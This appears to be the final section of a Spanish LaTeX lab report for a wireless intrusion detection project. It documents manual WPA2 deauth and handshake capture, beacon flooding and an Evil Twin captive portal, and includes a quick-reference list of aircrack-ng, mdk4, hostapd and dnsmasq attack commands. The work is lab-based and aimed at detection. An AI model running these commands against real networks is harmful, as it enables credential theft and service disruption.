\begin{enumerate}
  \item En el celular Redmi Note 7, ve a la lista de redes WiFi.
  \item Verás \texttt{LAB\_WARDEN\_UTP} (sin candado, abierta).
  \item Conéctate a esa red.
  \item Android detectará automáticamente que es una red con portal
    cautivo y lo abrirá. Si no lo abre solo, abre el navegador y entra
    a cualquier dirección (\texttt{example.com}, \texttt{google.com}).
  \item Verás el portal cautivo de WARDEN, con el aviso rojo de
    demostración.
  \item Ingresa credenciales \textbf{ficticias} - usa las estándar
    definidas en el Threat Model:
    \begin{itemize}
      \item Usuario: \texttt{demo.user@warden.test}
      \item Contraseña: \texttt{demo-password-12345}
    \end{itemize}
  \item Pulsa ``Iniciar sesion''.
  \item En la Terminal 3 (la del servidor Python), verás aparecer las
    credenciales capturadas con su timestamp.
\end{enumerate}

\subsection{Detener el ataque}
\texttt{Ctrl+C} en cada una de las tres terminales (servidor, dnsmasq,
hostapd) en ese orden. Restaura la interfaz si fue necesario:

\begin{lstlisting}
sudo nmcli device set wlp98s0 managed yes
sudo ip addr del 10.0.0.1/24 dev wlp98s0
\end{lstlisting}

\subsection{Lo que aprendimos}
Acabamos de ejecutar manualmente lo que la ESP32 hará en la fase 3 de la
cadena. Los componentes son:

\begin{itemize}
  \item Un AP falso clonando el SSID legítimo, sin protección.
  \item Asignación de IPs vía DHCP.
  \item Redirección DNS de todo a una IP local.
  \item Servidor web sirviendo un portal cautivo falso.
  \item Captura y registro de las credenciales ingresadas.
\end{itemize}

\textbf{La firma de detección del Evil Twin}: aparición de un nuevo BSSID
anunciando un SSID que ya estaba en uso por otro BSSID conocido,
generalmente con configuración de seguridad distinta (la red legítima
estaba en WPA2, el Evil Twin es abierto).

% ==============================================================================
\section{Resumen de lo validado}
% ==============================================================================

\begin{datatable}{L{10cm} L{2cm}}{Aspecto & Estado}
\drow{Interfaz renombrada a \texttt{panda0} (persistente vía udev)        & OK}
\drow{Adaptador detectado a nivel USB (\texttt{0e8d:7610})               & OK}
\drow{Driver \texttt{mt76x0u} cargado por el kernel                       & OK}
\drow{Modo \texttt{monitor} soportado por el chipset                       & OK}
\drow{Banda 2.4 GHz (canales 1 a 13) disponible                            & OK}
\drow{Activación de modo monitor exitosa                                   & OK}
\drow{Captura en vivo de frames 802.11 con \texttt{tcpdump}                & OK}
\drow{Captura y análisis con Wireshark                                     & OK}
\drow{Ataque manual 1: handshake WPA2 con deauth                           & OK}
\drow{Ataque manual 2: Beacon Flooding con \texttt{mdk4}                   & OK}
\drow{Ataque manual 3: Evil Twin con portal cautivo                        & OK}
\end{datatable}

\textbf{Conclusión:} el adaptador Panda Wireless PAU0B AC600 cumple
todos los requisitos técnicos del proyecto. Los tres ataques manuales
documentados son la base que la ESP32 va a automatizar en su firmware, y
que el detector del proyecto va a identificar.

% ==============================================================================
\section{Comandos de referencia rápida}
% ==============================================================================

\begin{lstlisting}
# --- Setup del Panda ---
ethtool -P panda0                       # MAC permanente
lsusb                                   # ver USB
sudo dmesg | grep -i mt76               # ver carga del driver
iw dev                                  # listar interfaces wireless
iw phy phy1 info                        # capacidades del chipset

# --- Activar modo monitor ---
sudo ip link set panda0 down
sudo iw dev panda0 set type monitor
sudo ip link set panda0 up
sudo iw dev panda0 set channel 6

# --- Desactivar modo monitor ---
sudo ip link set panda0 down
sudo iw dev panda0 set type managed
sudo ip link set panda0 up

# --- Captura ---
sudo tcpdump -i panda0 -c 20 -e         # validacion rapida
wireshark                               # captura grafica

# --- Ataque 1: handshake con deauth ---
sudo airodump-ng panda0                                          # escaneo
sudo airodump-ng --bssid <BSSID> -c <CH> -w handshake panda0     # captura enfocada
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENTE> panda0       # deauth
aircrack-ng handshake-01.cap                                     # verificar

# --- Ataque 2: Beacon Flooding ---
sudo mdk4 panda0 b -n ``FakeNet'' -c 6                             # flood con prefijo
sudo mdk4 panda0 b -c 6                                          # flood aleatorio

# --- Ataque 3: Evil Twin ---
sudo hostapd /tmp/eviltwin-hostapd.conf                          # AP falso
sudo dnsmasq -C /tmp/eviltwin-dnsmasq.conf -d                    # DHCP+DNS
sudo python3 servidor.py                                         # portal

# --- Restaurar NetworkManager si se apago ---
sudo systemctl start NetworkManager
nmcli device status
\end{lstlisting}

% ==============================================================================
\section{Próximos pasos}
% ==============================================================================

Con esta base validada, lo que sigue en el proyecto es:

\begin{enumerate}
  \item \textbf{Setup del router de laboratorio aislado}, con SSID
    \texttt{LAB\_WARDEN\_UTP} y desconectado de internet.
  \item \textbf{Implementación del firmware de la ESP32} que automatice
    los tres ataques que aquí ejecutamos manualmente.
  \item \textbf{Implementación del detector en Python con Scapy}, que
    identifique las firmas de cada uno de los tres ataques.
  \item \textbf{Pruebas end-to-end integradas:} ESP32 atacando
    $\rightarrow$ Panda capturando $\rightarrow$ detector alertando.
  \item \textbf{Demostración final} del sistema completo.
\end{enumerate}

\end{document}
